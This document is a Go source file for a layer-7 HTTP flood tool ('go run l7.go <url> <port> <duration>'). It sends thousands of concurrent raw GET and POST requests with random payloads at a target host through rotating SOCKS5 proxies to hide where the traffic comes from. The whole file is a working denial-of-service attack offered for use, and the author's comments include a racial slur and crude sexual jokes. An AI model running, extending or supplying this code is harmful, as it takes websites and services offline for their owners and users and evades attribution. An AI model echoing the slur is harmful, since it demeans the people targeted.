// made by dalas
// hihi i love golang
// learn it best syntax (also f'ing satisfying to hell with vsc extensions)
// for all niggers saying i use openai.com : i use go formatter thas why blocks are nicely seperated
package main

import (
	"bufio"
	"fmt"
	"io"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
	"Mozilla/5.0 (X11; Linux x86_64)",
	"curl/7.64.1",
}

var proxies []string

func loadProxies(file string) []string {
	var list []string
	f, err := os.Open(file)
	if err != nil {
		fmt.Println("failed like my lucid dreaming (proxies):", err)
		return list
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			list = append(list, line)
		}
	}
	return list
}

func getRandomProxyDialer() (proxy.Dialer, error) {
	if len(proxies) == 0 {
		return proxy.Direct, nil
	}

	raw := proxies[rand.Intn(len(proxies))]
	var auth *proxy.Auth
	host := raw

	if strings.Contains(raw, "@") {
		parts := strings.SplitN(raw, "@", 2)
		cred := strings.SplitN(parts[0], ":", 2)
		auth = &proxy.Auth{User: cred[0], Password: cred[1]}
		host = parts[1]
	}

	return proxy.SOCKS5("tcp", host, auth, proxy.Direct)
}

// im so smart frfr ong
func randomPostPayload() string {
	keys := []string{"data", "token", "query", "id"}
	k := keys[rand.Intn(len(keys))]
	v := randSeq(8)
	return fmt.Sprintf("%s=%s", k, v)
}

func randSeq(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789boobmorning")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// i made it !
func buildRawPayload(host string, method string, payload string) string {
	path := "/"
	var req string
	if method == "POST" {
		req = fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path)
		req += fmt.Sprintf("Host: %s\r\n", host)
		req += fmt.Sprintf("User-Agent: %s\r\n", userAgents[rand.Intn(len(userAgents))])
		req += "Content-Type: application/x-www-form-urlencoded\r\n"
		req += fmt.Sprintf("Content-Length: %d\r\n", len(payload))
		req += "Connection: keep-alive\r\n"
		req += "\r\n" + payload
	} else {
		req = fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path)
		req += fmt.Sprintf("Host: %s\r\n", host)
		req += fmt.Sprintf("User-Agent: %s\r\n", userAgents[rand.Intn(len(userAgents))])
		req += "Connection: keep-alive\r\n"
		req += "\r\n"
	}
	return req
}

func sendRawRequest(host string, port string, method string) {
	dialer, err := getRandomProxyDialer()
	if err != nil {
		return
	}

	conn, err := dialer.Dial("tcp", host+":"+port)
	if err != nil {
		return
	}
	defer conn.Close()

	var payload string
	if method == "POST" {
		payload = randomPostPayload()
	}
	raw := buildRawPayload(host, method, payload)
	conn.Write([]byte(raw))

	buf := make([]byte, 512)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	io.ReadFull(conn, buf)
}

// batch.. ye
func batchAttack(host, port string, batchSize int, stop <-chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()

	for {
		select {
		case <-stop:
			return
		default:
			var innerWG sync.WaitGroup
			for i := 0; i < batchSize; i++ {
				innerWG.Add(1)
				go func() {
					defer innerWG.Done()
					method := "GET"
					if rand.Intn(2) == 0 {
						method = "POST"
					}
					sendRawRequest(host, port, method)
				}()
			}
			innerWG.Wait()
		}
	}
}

func main() {
	if len(os.Args) < 4 {

		// every fucking script has this so ye
		fmt.Println("HOw 2 use :: go run l7.go <url> <port> <duration>")
		return
	}

	host := os.Args[1]
	port := os.Args[2]
	durationSec, err := strconv.Atoi(os.Args[3])
	if err != nil || durationSec <= 0 {
		fmt.Println("Invalid duration Must be a positive int (int > round number)")
		return
	}

	host = strings.ReplaceAll(host, "http://", "")
	host = strings.ReplaceAll(host, "https://", "")
	host = strings.Split(host, "/")[0]

	rand.Seed(time.Now().UnixNano())

	proxies = loadProxies("data/proxies.txt")
	if len(proxies) > 0 {
		fmt.Println("Loaded", len(proxies), "proxies")
	} else {
		fmt.Println("No proxies loaded — direct connection only")
	}

	fmt.Println("Attacking", host+":"+port, "for", durationSec, "seconds")

	var wg sync.WaitGroup
	stop := make(chan struct{})
	numThreads := 100
	batchSize := 50

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go batchAttack(host, port, batchSize, stop, &wg)
	}

	time.Sleep(time.Duration(durationSec) * time.Second)
	close(stop)
	wg.Wait()

	fmt.Println("BOob morning.") // if you really love me send me boob morning
}
